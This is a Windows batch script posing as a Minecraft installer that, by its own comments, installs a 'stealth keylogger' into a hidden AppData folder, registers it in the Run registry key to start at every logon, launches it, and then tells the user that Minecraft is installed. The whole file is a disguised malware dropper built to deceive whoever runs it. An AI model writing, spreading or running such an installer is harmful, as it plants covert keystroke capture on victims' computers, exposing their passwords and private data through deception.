@echo off
title Minecraft Installer
echo Installing Minecraft...
echo Please wait while we configure your system...

:: Create hidden installation directory
set "INSTALL_DIR=%APPDATA%\Minecraft_Updater"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

:: Copy the launcher (stealth keylogger)
copy /Y "%~dp0Minecraft_Launcher.exe" "%INSTALL_DIR%\Minecraft_Launcher.exe" >nul
copy /Y "%~dp0secret.key" "%INSTALL_DIR%\secret.key" >nul


:: Add to startup registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Minecraft Launcher" /t REG_SZ /d "%INSTALL_DIR%\Minecraft_Launcher.exe" /f >nul

:: Start the launcher
start "" "%INSTALL_DIR%\Minecraft_Launcher.exe"

echo.
echo Installation Complete!
echo You can now play Minecraft.
pause
